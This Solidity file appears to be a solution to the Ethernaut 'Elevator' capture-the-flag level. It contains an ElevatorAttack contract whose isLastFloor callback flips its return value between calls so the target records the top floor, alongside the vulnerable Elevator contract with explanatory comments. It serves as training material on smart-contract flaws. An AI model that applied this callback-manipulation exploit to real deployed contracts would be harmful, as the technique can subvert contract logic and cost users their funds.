
pragma solidity ^0.6.0;

// 0x297413cdf34241EfC02b3A3E9374461C52f90Bf0

/*
Elevator
Level completed!
Difficulty 4/10

This elevator won't let you reach the top of your building. Right?

Things that might help:
Sometimes solidity is not good at keeping promises.
This Elevator expects to be used from a Building.
You can use the view function modifier on an interface in order to prevent state modifications. The pure modifier also prevents functions from modifying the state. Make sure you read Solidity's documentation and learn its caveats.

An alternative way to solve this level is to build a view function which returns different results depends on input data but don't modify state, e.g. gasleft().

*/


/*
Soltuion
1. Set top floor
*/

contract ElevatorAttack {
    bool public toggle = true;
    Elevator public target;
    constructor(address _targetAddress) public{
        target = Elevator(_targetAddress);
    }
    
    function isLastFloor(uint) public returns (bool) {
        toggle = !toggle;
        return toggle;
        
    }
    
    function setTop(uint _floor) public {
        // Call goto method in Elevator function
        target.goTo(_floor);
    }
}

// SPDX-License-Identifier: MIT
// pragma solidity ^0.6.0;

interface Building {
    // This should have been a view function rather than external to indicate that it doesnt change the blockchain
    // External means we can change it from anywhere.
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;
  address public senderAttacker;

  function goTo(uint _floor) public {
      // This does not have to be a building. In this case, we used an ElevatorAttack
      // contract which also has isLastFloor method to conform with the Building interface
      // and also the ElevatorAttack address which changes the state of isLastFloor method.
      // IOW, msg.sender would be the ElevatorAttack smart contract address
    Building building = Building(msg.sender);
   senderAttacker = address(building);
    //  This is actually calling isLastFloor onElevator smartcontract
    // as we have a pointer to that address now(msg.sender) which also conform with the interface(i.e has isLastFloor method).
    // This is false the first time ElevatorAttack calls isLastFloor
    // which makes this block true
    if (!building.isLastFloor(_floor)) { 
      floor = _floor;
      // The ElevatorAttack contract had toggled to false earlier, and 
      // will now toggle to true this time making us reach the top regardless 
      // of the floor number we set
      top = building.isLastFloor(floor);
    }
  }
}
